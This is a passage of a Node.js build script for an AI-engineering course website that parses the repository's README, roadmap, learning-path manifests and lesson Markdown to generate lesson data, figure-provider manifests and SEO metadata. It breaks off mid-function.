#!/usr/bin/env node
/**
 * Build script for AI Engineering from Scratch website.
 * Parses README.md, ROADMAP.md, and glossary/terms.md from the repo root
 * and generates data.js with all phase/lesson/glossary data.
 *
 * Run: node site/build.js
 * Called automatically by GitHub Actions on every push.
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const REPO_ROOT = path.resolve(__dirname, '..');
const README_PATH = path.join(REPO_ROOT, 'README.md');
const ROADMAP_PATH = path.join(REPO_ROOT, 'ROADMAP.md');
const GLOSSARY_PATH = path.join(REPO_ROOT, 'glossary', 'terms.md');
const OUTPUT_PATH = path.join(__dirname, 'data.js');
const CERTIFICATIONS_PATH = path.join(REPO_ROOT, 'certifications');
const CERTIFICATION_OUTPUT_PATH = path.join(__dirname, 'certification-data.js');
const FIGURE_MANIFEST_OUTPUT_PATH = path.join(__dirname, 'figure-manifest.js');
const LESSON_SEO_OUTPUT_PATH = path.join(__dirname, 'lesson-seo.json');
const CERTIFICATION_SEO_OUTPUT_PATH = path.join(__dirname, 'certification-seo.json');
const SEO_MANIFEST_VERSION = 1;
const CATALOG_DISCOVERY_START = '<!-- GENERATED:LESSON-DISCOVERY:START -->';
const CATALOG_DISCOVERY_END = '<!-- GENERATED:LESSON-DISCOVERY:END -->';
const CERTIFICATION_DISCOVERY_START = '<!-- GENERATED:CERTIFICATION-DISCOVERY:START -->';
const CERTIFICATION_DISCOVERY_END = '<!-- GENERATED:CERTIFICATION-DISCOVERY:END -->';

// Registration order is public behavior. Later providers intentionally replace
// selected legacy figures, including figures-tools3.js -> figures-mcp.js.
const FIGURE_PROVIDER_ORDER = [
  'figures.js',
  'figures-math.js',
  'figures-ml.js',
  'figures-dl.js',
  'figures-vision-speech.js',
  'figures-transformers.js',
  'figures-genai-rl.js',
  'figures-llms-systems.js',
  'figures-agents-alignment.js',
  'figures-math2.js',
  'figures-nlp2.js',
  'figures-llms2.js',
  'figures-infra.js',
  'figures-frontier.js',
  'figures-llmeng.js',
  'figures-multimodal.js',
  'figures-agents2.js',
  'figures-alignment2.js',
  'figures-foundations2.js',
  'figures-capstone-a.js',
  'figures-capstone-b.js',
  'figures-agents3.js',
  'figures-nlp3.js',
  'figures-cv2.js',
  'figures-llms3.js',
  'figures-autonomous2.js',
  'figures-swarms2.js',
  'figures-infra2.js',
  'figures-systems3.js',
  'figures-capstone-c.js',
  'figures-capstone-d.js',
  'figures-cv3.js',
  'figures-speech2.js',
  'figures-multimodal2.js',
  'figures-tools2.js',
  'figures-agents4.js',
  'figures-swarms3.js',
  'figures-genai3.js',
  'figures-misc2.js',
  'figures-history.js',
  'figures-capstone-e.js',
  'figures-capstone-f.js',
  'figures-capstone-g.js',
  'figures-capstone-h.js',
  'figures-capstone-i.js',
  'figures-alignment3.js',
  'figures-alignment4.js',
  'figures-workbench.js',
  'figures-tools3.js',
  'figures-mcp.js',
  'figures-setup.js',
  'figures-foundations3.js',
  'figures-visaudio4.js',
  'figures-nlp5.js',
  'figures-llmstack5.js',
  'figures-autoswarm5.js',
  'figures-infra4.js',
  'figures-claude-certifications.js',
];

const GITHUB_BASE = 'https://github.com/rohitg00/ai-engineering-from-scratch/tree/main/';
const SITE_ORIGIN = 'https://aiengineeringfromscratch.com';

// GITHUB_BASE lesson url -> site path "phases/<phase>/<lesson>"
function lessonPath(url) {
  if (!url) return null;
  const m = url.match(/(phases\/[^/]+\/[^/]+)\/?$/);
  return m ? m[1] : null;
}

// ─── Parse ROADMAP.md for lesson statuses ────────────────────────────
function parseRoadmap(content) {
  const statuses = {}; // { "Phase 0": { phaseStatus, lessons: { "Dev Environment": "complete" } } }
  let currentPhase = null;
  let currentPhaseStatus = null;

  for (const line of content.split(/\r?\n/)) {
    // Match phase headers like: ## Phase 0: Setup & Tooling — ✅
    const phaseMatch = line.match(/^##\s+Phase\s+(\d+).*?—\s*(✅|🚧|⬚)/);
    if (phaseMatch) {
      const phaseId = parseInt(phaseMatch[1]);
      const statusEmoji = phaseMatch[2];
      currentPhaseStatus = statusEmoji === '✅' ? 'complete' : statusEmoji === '🚧' ? 'in-progress' : 'planned';
      currentPhase = `Phase ${phaseId}`;
      statuses[currentPhase] = { phaseStatus: currentPhaseStatus, lessons: {} };
      continue;
    }

    // Match lesson rows like: | 01 | Dev Environment | ✅ |
    if (currentPhase) {
      const lessonMatch = line.match(/^\|\s*\d+\s*\|\s*(.+?)\s*\|\s*(✅|🚧|⬚)\s*\|/);
      if (lessonMatch) {
        const lessonName = lessonMatch[1].trim();
        const statusEmoji = lessonMatch[2];
        const status = statusEmoji === '✅' ? 'complete' : statusEmoji === '🚧' ? 'in-progress' : 'planned';
        statuses[currentPhase].lessons[lessonName] = status;
      }
    }
  }

  return statuses;
}

// ─── Parse README.md for phases and lessons ──────────────────────────
function parseReadme(content, roadmapStatuses) {
  const phases = [];

  // Split into phase blocks
  // Phase 0 is in a <table> block, phases 1-19 are in <details> blocks
  // We'll parse line by line to extract phase headers and lesson tables

  const lines = content.split(/\r?\n/);
  let currentPhase = null;
  let inLessonTable = false;
  let isCapstoneTable = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];

    // Match Phase header - multiple formats supported:
    // Old: ### Phase 0: Setup & Tooling `12 lessons`
    // Old: <summary><strong>Phase 1: Math Foundations</strong> <code>22 lessons</code> ... <em>Description</em></summary>
    // New: ### ![](https://img.shields.io/badge/Phase_0-Setup_&_Tooling-95A5A6?style=for-the-badge) `12 lessons`
    // New: <summary><b>🟣 Phase 1 — Math Foundations</b> &nbsp;<code>22 lessons</code>&nbsp; <em>Description</em></summary>
    const phaseHeaderMatch =
      line.match(/###\s+Phase\s+(\d+):\s+(.+?)\s*`(\d+)\s+lessons?`/) ||
      line.match(/###\s+!\[\]\([^)]*?Phase[_\s]+(\d+)[-_]([^?)]+?)-[A-F0-9]{6}[^)]*\)\s*`(\d+)\s+lessons?`/i);
    const detailsHeaderMatch =
      line.match(/<summary><strong>Phase\s+(\d+):\s+(.+?)<\/strong>\s*<code>(\d+)\s+(?:lessons?|projects?)<\/code>.*?<em>(.*?)<\/em>/) ||
      line.match(/<summary>\s*<b>\s*(?:[^\w\s]+\s+)?Phase\s+(\d+)\s*[—\-:]\s*(.+?)<\/b>.*?<code>(\d+)\s+(?:lessons?|projects?)<\/code>.*?<em>(.*?)<\/em>/);

    if (phaseHeaderMatch) {
      const [, idStr, rawName] = phaseHeaderMatch;
      const id = parseInt(idStr);
      const name = rawName.replace(/_/g, ' ').trim();
      // Look for the description on the next line (blockquote)
      let desc = '';
      for (let j = i + 1; j < Math.min(i + 5, lines.length); j++) {
        if (lines[j].startsWith('>')) {
          desc = lines[j].replace(/^>\s*/, '').trim();
          break;
        }
      }
      const roadmapKey = `Phase ${id}`;
      const phaseStatus = roadmapStatuses[roadmapKey]?.phaseStatus || 'planned';
      currentPhase = { id, name: name.trim(), status: phaseStatus, desc, lessons: [] };
      phases.push(currentPhase);
      inLessonTable = false;
      continue;
    }

    if (detailsHeaderMatch) {
      const [, idStr, name, , desc] = detailsHeaderMatch;
      const id = parseInt(idStr);
      const roadmapKey = `Phase ${id}`;
      const phaseStatus = roadmapStatuses[roadmapKey]?.phaseStatus || 'planned';
      currentPhase = { id, name: name.trim(), status: phaseStatus, desc: desc?.trim() || '', lessons: [] };
      phases.push(currentPhase);
      inLessonTable = false;
      continue;
    }

    // Detect start of lesson table
    if (currentPhase && line.match(/^\|\s*#\s*\|\s*Lesson/)) {
      inLessonTable = true;
      isCapstoneTable = false;
      continue;
    }

    // Skip table separator
    if (inLessonTable && line.match(/^\|[\s:|-]+\|$/)) {
      continue;
    }

    // Parse lesson rows
    if (inLessonTable && currentPhase && line.startsWith('|')) {
      // | 01 | [Dev Environment](phases/00-setup-and-tooling/01-dev-environment/) | Build | Python, Node, Rust |
      // | 02 | Multi-Layer Networks & Forward Pass | Build | Python |
      const cols = line.split('|').map(c => c.trim()).filter(c => c.length > 0);
      if (cols.length >= 4) {
        const lessonCol = cols[1];
        const typeRaw = cols[2];
        const langRaw = cols[3];

        // Type may be plain ("Build") or a shield image: ![Build](https://...)
        const typeBadgeMatch = typeRaw.match(/!\[([^\]]+)\]/);
        const type = typeBadgeMatch ? typeBadgeMatch[1] : typeRaw;

        // Lang may be plain ("Python, Rust") or emoji flags (🐍 🟦 🦀 🟣 ⚛️)
        const EMOJI_LANG = {
          '🐍': 'Python',
          '🟦': 'TypeScript',
          '🦀': 'Rust',
          '🟣': 'Julia',
          '⚛️': 'React',
          '⚛': 'React',
        };
        let lang = langRaw;
        if (/[\uD800-\uDBFF\u2600-\u27BF\u1F300-\u1FAFF]/.test(langRaw) || /[🐍🟦🦀🟣⚛]/u.test(langRaw)) {
          const tokens = Array.from(langRaw)
            .map(ch => EMOJI_LANG[ch])
            .filter(Boolean);
          if (tokens.length) lang = [...new Set(tokens)].join(', ');
          else if (langRaw.trim() === '—' || langRaw.trim() === '-') lang = '';
        }
        if (lang === '—' || lang === '-') lang = '';

        // Check if lesson has a link (meaning it has content)
        const linkMatch = lessonCol.match(/\[(.+?)\]\((.+?)\)/);
        let lessonName, url;
        if (linkMatch) {
          lessonName = linkMatch[1];
          const relativePath = linkMatch[2];
          url = GITHUB_BASE + relativePath.replace(/^\//, '');
        } else {
          lessonName = lessonCol;
          url = null;
        }

        // Get status from roadmap
        const roadmapKey = `Phase ${currentPhase.id}`;
        const roadmapPhase = roadmapStatuses[roadmapKey];
        let status = 'planned';
        if (roadmapPhase) {
          // Try to find matching lesson by fuzzy match
          const lessonNameClean = lessonName.replace(/[-–—:]/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
          for (const [rName, rStatus] of Object.entries(roadmapPhase.lessons)) {
            const rNameClean = rName.replace(/[-–—:]/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
            if (rNameClean.includes(lessonNameClean) || lessonNameClean.includes(rNameClean) ||
                rNameClean.split(' ').slice(0, 3).join(' ') === lessonNameClean.split(' ').slice(0, 3).join(' ')) {
              status = rStatus;
              break;
            }
          }
        }

        // If it has a link, it's at least complete (override roadmap if needed)
        if (url && status === 'planned') {
          status = 'complete';
        }

        // Capstone tables use the middle column for prerequisite phase tokens
        // (e.g., "P11 P13 P14"), not a Build/Learn enum. Keep `type` on the
        // Build/Learn axis so CSS selectors (data-type="Build"/"Learn") stay
        // valid, and emit the prereq string in a dedicated `combines` field.
        const lessonEntry = {
          name: lessonName.trim(),
          status,
          type: isCapstoneTable ? 'Capstone' : type.trim(),
          lang: lang.trim() || '—',
          ...(isCapstoneTable && { combines: type.trim() }),
          ...(url && { url }),
        };
        currentPhase.lessons.push(lessonEntry);
      }
    }

    // End of table
    if (inLessonTable && (line.match(/<\/td>/) || line.match(/<\/details>/) || (line.trim() === '' && i + 1 < lines.length && !lines[i + 1].startsWith('|')))) {
      inLessonTable = false;
    }

    // Also detect capstone table format (# | Project | Combines | Lang)
    if (currentPhase && line.match(/^\|\s*#\s*\|\s*Project/)) {
      inLessonTable = true;
      isCapstoneTable = true;
      continue;
    }
  }

  return phases;
}

// ─── Parse focused learning paths ────────────────────────────────────
// A learning path is an ordered overlay on the canonical PHASES data. The
// manifest owns intent and pacing; README owns the lesson title and URL.
function parseLearningPaths(repoRoot = REPO_ROOT, phases = []) {
  const learningPathsDir = path.join(repoRoot, 'learning-paths');
  if (!fs.existsSync(learningPathsDir)) return [];

  const lessonsByPath = new Map();
  for (const phase of phases) {
    for (const lesson of phase.lessons || []) {
      const canonicalPath = lessonPath(lesson.url);
      if (!canonicalPath) continue;
      lessonsByPath.set(canonicalPath, {
        title: lesson.name,
        phaseId: phase.id,
        phaseName: phase.name,
        type: lesson.type,
        lang: lesson.lang,
      });
    }
  }

  const manifests = fs.readdirSync(learningPathsDir)
    .filter(file => file.endsWith('.json'))
    .sort();
  const ids = new Set();

  return manifests.map(file => {
    const manifestPath = path.join(learningPathsDir, file);
    const manifest = readJson(manifestPath, `learning path ${file}`);
    const id = String(manifest.id || path.basename(file, '.json')).trim();
    if (!id) throw new Error(`Learning path ${file} needs an id`);
    if (ids.has(id)) throw new Error(`Duplicate learning path id: ${id}`);
    ids.add(id);

    const prerequisiteIds = new Set();
    const prerequisites = (Array.isArray(manifest.prerequisites) ? manifest.prerequisites : [])
      .map((entry, index) => {
        if (!entry || typeof entry !== 'object' || Array.isArray(entry)) {
          throw new Error(`Learning path ${id} prerequisite ${index + 1} must be an object`);
        }
        const normalized = { ...entry };
        if (!Object.prototype.hasOwnProperty.call(normalized, 'id')) return normalized;
        const checkId = String(normalized.id || '').trim();
        if (!checkId) {
          throw new Error(`Learning path ${id} prerequisite ${index + 1} has an empty id`);
        }
        if (prerequisiteIds.has(checkId)) {
          throw new Error(`Learning path ${id} repeats prerequisite id: ${checkId}`);
        }
        prerequisiteIds.add(checkId);
        normalized.id = checkId;
        return normalized;
      });

    function normalizePrerequisiteChecks(value, lessonPath) {
      if (value === undefined) return [];
      if (!Array.isArray(value)) {
        throw new Error(`Learning path ${id} lesson ${lessonPath} prerequisiteChecks must be an array`);
      }
      const seen = new Set();
      return value.map(rawId => {
        if (typeof rawId !== 'string' || !rawId.trim()) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite check id`);
        }
        const checkId = rawId.trim();
        if (seen.has(checkId)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} repeats prerequisite check: ${checkId}`);
        }
        if (!prerequisiteIds.has(checkId)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} references an unknown prerequisite check: ${checkId}`);
        }
        seen.add(checkId);
        return checkId;
      });
    }

    function normalizePrerequisitePaths(value, lessonPath) {
      if (value === undefined) return [];
      if (!Array.isArray(value)) {
        throw new Error(`Learning path ${id} lesson ${lessonPath} prerequisitePaths must be an array`);
      }
      const seen = new Set();
      return value.map(rawPath => {
        if (typeof rawPath !== 'string') {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite path`);
        }
        const prerequisitePath = rawPath.replace(/^\/+|\/+$/g, '');
        if (!prerequisitePath) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite path`);
        }
        if (seen.has(prerequisitePath)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} repeats prerequisite path: ${prerequisitePath}`);
        }
        seen.add(prerequisitePath);
        return prerequisitePath;
      });
    }

    function normalizeEntry(entry, index, required) {
      const source = typeof entry === 'string' ? { path: entry } : { ...(entry || {}) };
      const canonicalPath = String(source.path || '').replace(/^\/+|\/+$/g, '');
      if (!canonicalPath) {
        throw new Error(`Learning path ${id} has a lesson without a path`);
      }
      const lesson = lessonsByPath.get(canonicalPath);
      if (!lesson) {
        throw new Error(`Learning path ${id} references an unknown lesson: ${canonicalPath}`);
      }
      return {
        ...source,
        order: Number.isFinite(Number(source.order)) ? Number(source.order) : index + 1,
        path: canonicalPath,
        title: lesson.title,
        phaseId: lesson.phaseId,
        phaseName: lesson.phaseName,
        type: lesson.type,
        lang: lesson.lang,
        required: required ? source.required !== false : false,
        prerequisiteChecks: normalizePrerequisiteChecks(source.prerequisiteChecks, canonicalPath),
        ...(source.prerequisitePaths !== undefined && {
          prerequisitePaths: normalizePrerequisitePaths(source.prerequisitePaths, canonicalPath),
        }),
      };
    }

    const requiredEntries = Array.isArray(manifest.lessons) ? manifest.lessons : [];
    const optionalEntries = Array.isArray(manifest.optionalLessons) ? manifest.optionalLessons : [];
    if (!requiredEntries.length) throw new Error(`Learning path ${id} needs at least one lesson`);

    const byOrder = (a, b) => a.order - b.order;
    const lessons = requiredEntries
      .map((entry, index) => normalizeEntry(entry, index, true))
      .sort(byOrder);
    const optionalLessons = optionalEntries
      .map((entry, index) => normalizeEntry(entry, index, false))
      .sort(byOrder);
    const seenPaths = new Set();
    for (const entry of lessons.concat(optionalLessons)) {
      if (seenPaths.has(entry.path)) {
        throw new Error(`Learning path ${id} repeats lesson: ${entry.path}`);
      }
      seenPaths.add(entry.path);
    }

    const routeEntries = lessons.concat(optionalLessons);
    const routeIndex = new Map(routeEntries.map((entry, index) => [entry.path, index]));
    const prerequisiteGraph = new Map();
    for (const entry of routeEntries) {
      const prerequisitePaths = Array.isArray(entry.prerequisitePaths)
        ? entry.prerequisitePaths
        : [];
      for (const prerequisitePath of prerequisitePaths) {
        if (!lessonsByPath.has(prerequisitePath)) {
          throw new Error(
            `Learning path ${id} lesson ${entry.path} references an unknown prerequisite path: ${prerequisitePath}`
          );
        }
        if (prerequisitePath === entry.path) {
          throw new Error(`Learning path ${id} lesson ${entry.path} cannot depend on itself`);
        }
      }
      prerequisiteGraph.set(
        entry.path,
        prerequisitePaths.filter(prerequisitePath => routeIndex.has(prerequisitePath))
      );
    }

    const visiting = [];
    const visitingSet = new Set();
    const visited = new Set();
    function visitPrerequisites(lessonPath) {
      if (visitingSet.has(lessonPath)) {
        const cycleStart = visiting.indexOf(lessonPath);
        const cycle = visiting.slice(cycleStart).concat(lessonPath);
        throw new Error(`Learning path ${id} contains a prerequisite cycle: ${cycle.join(' -> ')}`);
      }
      if (visited.has(lessonPath)) return;
      visiting.push(lessonPath);
      visitingSet.add(lessonPath);
      for (const prerequisitePath of prerequisiteGraph.get(lessonPath) || []) {
        visitPrerequisites(prerequisitePath);
      }
      visiting.pop();
      visitingSet.delete(lessonPath);
      visited.add(lessonPath);
    }
    for (const entry of routeEntries) visitPrerequisites(entry.path);

    for (const entry of routeEntries) {
      for (const prerequisitePath of prerequisiteGraph.get(entry.path) || []) {
        if (routeIndex.get(prerequisitePath) >= routeIndex.get(entry.path)) {
          throw new Error(
            `Learning path ${id} lesson ${entry.path} has a forward prerequisite: ${prerequisitePath}`
          );
        }
      }
    }

    return {
      ...manifest,
      id,
      title: String(manifest.title || id).trim(),
      summary: String(manifest.summary || '').trim(),
      estimatedMinutes: Number(manifest.estimatedMinutes || 0),
      prerequisites,
      lessons,
      optionalLessons,
    };
  });
}

// ─── Resolve figure IDs to the provider scripts that register them ─────────
// Lessons are fetched at runtime and translated lessons can retain figure
// fences, so the browser resolves providers from the rendered data-figure IDs.
// The build emits only IDs that are actually used by lesson Markdown.
function collectMarkdownFiles(directory, files = []) {
  if (!fs.existsSync(directory)) return files;
  const entries = fs.readdirSync(directory, { withFileTypes: true })
    .sort((a, b) => a.name.localeCompare(b.name));
  for (const entry of entries) {
    const fullPath = path.join(directory, entry.name);
    if (entry.isDirectory()) collectMarkdownFiles(fullPath, files);
    else if (entry.isFile() && entry.name.endsWith('.md')) files.push(fullPath);
  }
  return files;
}

function discoverUsedFigureIds(repoRoot = REPO_ROOT) {
  const ids = new Set();
  const roots = [path.join(repoRoot, 'phases'), path.join(repoRoot, 'certifications')];
  for (const root of roots) {
    for (const file of collectMarkdownFiles(root, [])) {
      const markdown = fs.readFileSync(file, 'utf8');
      for (const match of markdown.matchAll(/```figure\s*\r?\n([\s\S]*?)```/g)) {
        const id = match[1].trim().split(/\s+/)[0];
        if (id) ids.add(id);
      }
    }
  }
  return [...ids].sort();
}

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function assetVersion(content) {
  return crypto.createHash('sha256').update(content).digest('hex').slice(0, 12);
}

function discoverFigureProviderOrder(siteDir = __dirname, baseOrder = FIGURE_PROVIDER_ORDER) {
  const known = new Set(baseOrder);
  const additions = fs.readdirSync(siteDir)
    .filter(file => /^figures(?:-[a-z0-9-]+)?\.js$/i.test(file) && !known.has(file))
    .sort((a, b) => a.localeCompare(b));
  return baseOrder.concat(additions);
}

function buildFigureProviderManifest(
  repoRoot = REPO_ROOT,
  siteDir = __dirname,
  providerOrder
) {
  const resolvedProviderOrder = Array.isArray(providerOrder)
    ? providerOrder.slice()
    : discoverFigureProviderOrder(siteDir);
  const providerSources = new Map();
  const providerVersions = {};
  for (const provider of resolvedProviderOrder) {
    const providerPath = path.join(siteDir, provider);
    if (!fs.existsSync(providerPath)) throw new Error(`Missing figure provider: ${provider}`);
    const source = fs.readFileSync(providerPath, 'utf8');
    providerSources.set(provider, source);
    providerVersions[provider] = assetVersion(source);
  }
  const localSource = fs.readFileSync(path.join(siteDir, 'lesson-figures.js'), 'utf8');
  const providersByFigure = {};
  const unresolved = [];
  for (const id of discoverUsedFigureIds(repoRoot)) {
    const quotedId = new RegExp(`['"]${escapeRegExp(id)}['"]`);
    const providers = resolvedProviderOrder.filter(provider => quotedId.test(providerSources.get(provider)));
    if (providers.length) providersByFigure[id] = providers;
    else if (!quotedId.test(localSource)) unresolved.push(id);
  }
  if (unresolved.length) {
    throw new Error(`Figure IDs have no provider: ${unresolved.join(', ')}`);
  }
  return { providerOrder: resolvedProviderOrder, providerVersions, providersByFigure };
}

function syncFigureAssetVersions(siteDir, manifestSource) {
  const lessonPath = path.join(siteDir, 'lesson.html');
  const runtimePath = path.join(siteDir, 'lesson-figures.js');
  if (!fs.existsSync(lessonPath) || !fs.existsSync(runtimePath)) return;

  const versions = {
    'lesson-figures.js': assetVersion(fs.readFileSync(runtimePath, 'utf8')),
    'figure-manifest.js': assetVersion(manifestSource),
  };
  let html = fs.readFileSync(lessonPath, 'utf8');
  for (const [file, version] of Object.entries(versions)) {
    const reference = new RegExp(`(<script src="${escapeRegExp(file)})(?:\\?v=[^"]*)?("></script>)`);
    if (!reference.test(html)) throw new Error(`lesson.html is missing the ${file} script reference`);
    html = html.replace(reference, `$1?v=${version}$2`);
  }
  fs.writeFileSync(lessonPath, html, 'utf8');
}

function serializeFigureProviderManifest(manifest) {
  return '// Auto-generated by build.js from lesson figure fences and provider registrations.\n' +
    '// Provider order is significant: later registrations override earlier ones.\n' +
    `window.AIFS_FIGURE_PROVIDER_ORDER = ${JSON.stringify(manifest.providerOrder, null, 2)};\n` +
    `window.AIFS_FIGURE_PROVIDER_VERSIONS = ${JSON.stringify(manifest.providerVersions, null, 2)};\n` +
    `window.AIFS_FIGURE_PROVIDERS = ${JSON.stringify(manifest.providersByFigure, null, 2)};\n`;
}

function writeFigureManifest(repoRoot = REPO_ROOT, siteDir = __dirname) {
  const manifest = buildFigureProviderManifest(repoRoot, siteDir);
  const output = serializeFigureProviderManifest(manifest);
  const outputPath = siteDir === __dirname
    ? FIGURE_MANIFEST_OUTPUT_PATH
    : path.join(siteDir, 'figure-manifest.js');
  fs.writeFileSync(outputPath, output, 'utf8');
  syncFigureAssetVersions(siteDir, output);
  console.log(`   wrote figure-manifest.js (${Object.keys(manifest.providersByFigure).length} routed figures)`);
  return manifest;
}

// ─── Parse the canonical phase dependency graph from README.md ───────
// The public Mermaid diagram under "The shape of the curriculum" owns the
// phase-level learning path. Keeping the website graph generated from it
// prevents the interactive roadmap from drifting into a second curriculum.
function parseCurriculumPrereqs(content, phases) {
  const section = content.match(/## The shape of the curriculum[\s\S]*?```mermaid\s*\r?\n([\s\S]*?)```/);
  if (!section) throw new Error('README.md is missing the canonical curriculum Mermaid graph');

  const phaseIds = phases.map(phase => phase.id).sort((a, b) => a - b);
  const validIds = new Set(phaseIds);
  const prerequisites = {};
  const children = {};
  const seenEdges = new Set();
  for (const id of phaseIds) {
    prerequisites[id] = [];
    children[id] = [];
  }

  for (const line of section[1].split(/\r?\n/)) {
    const match = line.match(/^\s*P(\d+)(?:\[[^\]]*\])?\s*-->\s*P(\d+)/);
    if (!match) continue;
    const from = Number(match[1]);
    const to = Number(match[2]);
    if (!validIds.has(from) || !validIds.has(to)) {
      throw new Error(`Curriculum edge P${from} -> P${to} references an unknown phase`);
    }
    if (from === to) throw new Error(`Curriculum phase P${from} cannot depend on itself`);
    const key = `${from}-${to}`;
    if (seenEdges.has(key)) throw new Error(`Duplicate curriculum edge P${from} -> P${to}`);
    seenEdges.add(key);
    prerequisites[to].push(from);
    children[from].push(to);
  }

  if (!seenEdges.size) throw new Error('The canonical curriculum Mermaid graph contains no edges');

  const roots = phaseIds.filter(id => prerequisites[id].length === 0);
  if (roots.length !== 1 || roots[0] !== 0) {
    throw new Error(`Curriculum graph must have Phase 0 as its only root; found ${roots.join(', ') || 'none'}`);
  }

  const reached = new Set([0]);
  const queue = [0];
  while (queue.length) {
    const id = queue.shift();
    for (const child of children[id]) {
      if (reached.has(child)) continue;
      reached.add(child);
      queue.push(child);
    }
  }
  const unreachable = phaseIds.filter(id => !reached.has(id));
  if (unreachable.length) {
    throw new Error(`Curriculum graph has unreachable phases: ${unreachable.join(', ')}`);
  }

  const visiting = new Set();
  const visited = new Set();
  function visit(id) {
    if (visiting.has(id)) throw new Error(`Curriculum graph contains a cycle through Phase ${id}`);
    if (visited.has(id)) return;
    visiting.add(id);
    for (const child of children[id]) visit(child);
    visiting.delete(id);
    visited.add(id);
  }
  visit(0);

  return prerequisites;
}

// ─── Extract lesson summary + keywords from docs/en.md ───────────────
/**
 * Single-pass read of a lesson's docs/en.md.
 *
 * Returns:
 *   summary  — first `> blockquote` line (the lesson's one-liner motto).
 *   keywords — all `### H3` heading texts joined by ' · '.
 *              H3 headings are the densest vocabulary in a lesson doc
 *              (e.g. "Scaled dot-product · Causal masking · KV cache"),
 *              so they extend search coverage without bloating data.js.
 *
 * Both fields are empty strings when the file is absent or has no
 * matching content — expected for planned lessons with no docs yet.
 */
function extractLessonMeta(relPath) {
  const docPath = path.join(REPO_ROOT, relPath, 'docs', 'en.md');
  const result = { summary: '', keywords: '' };
  try {
    const lines = fs.readFileSync(docPath, 'utf8').split(/\r?\n/);
    const h3s = [];
    for (const raw of lines) {
      const line = raw.trim();
      if (!result.summary && line.startsWith('> ') && line.length > 3) {
        const s = line.slice(2).trim();
        result.summary = s.length > 180 ? s.slice(0, 177) + '…' : s;
      }
      if (line.startsWith('### ')) {
        const heading = line.slice(4).trim();
        if (heading) h3s.push(heading);
      }
    }
    if (h3s.length) result.keywords = h3s.join(' · ');
  } catch (_) {
    // File absent or unreadable — expected for planned lessons.
  }
  return result;
}

function normalizeWhitespace(value) {
  return String(value || '').replace(/\s+/g, ' ').trim();
}

function plainMarkdown(value) {
  return normalizeWhitespace(value)
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/\[([^\]]+)\]\([^)]*\)/g, '$1')
    .replace(/<[^>]+>/g, ' ')
    .replace(/`([^`]+)`/g, '$1')
    .replace(/[*_~]+/g, '')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&quot;/gi, '"')
    .replace(/&#39;/gi, "'")
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/\\([\\`*_[\]{}()#+\-.!])/g, '$1');
}

function truncateText(value, limit) {
  const text = normalizeWhitespace(value);
  if (!limit || text.length <= limit) return text;
  const clipped = text.slice(0, Math.max(0, limit - 1));
  const boundary = clipped.lastIndexOf(' ');
  return (boundary >= Math.floor(limit * 0.65) ? clipped.slice(0, boundary) : clipped).trimEnd() + '…';
}

function wordCount(value) {
  const text = normalizeWhitespace(value);
  return text ? text.split(' ').length : 0;
}

function truncateWords(value, limit) {
  const words = normalizeWhitespace(value).split(' ').filter(Boolean);
  if (!limit || words.length <= limit) return words.join(' ');
  return words.slice(0, limit).join(' ') + '…';
}

function seoTitleFor(title) {
  const brandedTitle = `${title} | AI Engineering from Scratch`;
  return brandedTitle.length <= 60 ? brandedTitle : truncateText(title, 60);
}

function descriptionFromParts(title, parts) {
  const uniqueParts = [];
  for (const value of parts) {
    const text = normalizeWhitespace(value);
    if (text && !uniqueParts.includes(text)) uniqueParts.push(text);
  }
  let body = '';
  for (const part of uniqueParts) {
    body = normalizeWhitespace(`${body} ${part}`);
    const candidate = body.toLowerCase().startsWith(title.toLowerCase()) ? body : `${title}: ${body}`;
    if (candidate.length >= 125) break;
  }
  const source = body
    ? (body.toLowerCase().startsWith(title.toLowerCase()) ? body : `${title}: ${body}`)
    : title;
  return { description: truncateText(source, 160), descriptionSourceLength: source.length };
}

function lessonDocumentSeo(markdown, fallbackTitle) {
  const lines = String(markdown || '').split(/\r?\n/);
  let title = normalizeWhitespace(fallbackTitle);
  let summary = '';
  let inFence = false;
  let paragraph = [];
  const paragraphs = [];

  function flushParagraph() {
    const text = plainMarkdown(paragraph.join(' '));
    if (text) paragraphs.push(text);
    paragraph = [];
  }

  for (const raw of lines) {
    const line = raw.trim();
    if (/^```/.test(line)) {
      flushParagraph();
      inFence = !inFence;
      continue;
    }
    if (inFence) continue;
    if (!line) {
      flushParagraph();
      continue;
    }
    if (line.startsWith('# ')) {
      title = plainMarkdown(line.slice(2)) || title;
      flushParagraph();
      continue;
    }
    if (line.startsWith('>')) {
      if (!summary) summary = plainMarkdown(line.replace(/^>\s*/, ''));
      flushParagraph();
      continue;
    }
    const listItem = line.match(/^(?:[-*+]\s|\d+[.)]\s)(.+)$/);
    if (listItem) {
      const item = plainMarkdown(listItem[1]).replace(/^\[[ xX]\]\s*/, '');
      if (item) paragraph.push(/[.!?]$/.test(item) ? item : item + '.');
      continue;
    }
    if (/^#{2,6}\s/.test(line) ||
        /^\*\*(Type|Languages|Prerequisites|Time):\*\*/i.test(line) ||
        /^\|/.test(line) ||
        /^(?:---+|===+)$/.test(line)) {
      flushParagraph();
      continue;
    }
    paragraph.push(line);
  }
  flushParagraph();

  const proseParts = [summary].concat(paragraphs).filter(Boolean);
  const excerptSource = proseParts.join(' ') || title;
  const excerpt = truncateWords(excerptSource, 220);
  const { description, descriptionSourceLength } = descriptionFromParts(title, proseParts);
  return {
    title,
    seoTitle: seoTitleFor(title),
    description,
    excerpt,
    sourceWordCount: wordCount(excerptSource),
    descriptionSourceLength,
  };
}

function canonicalLessonUrl(lessonPathValue) {
  return `${SITE_ORIGIN}/lesson?path=${encodeURIComponent(lessonPathValue)}`;
}

function lessonHref(lessonPathValue) {
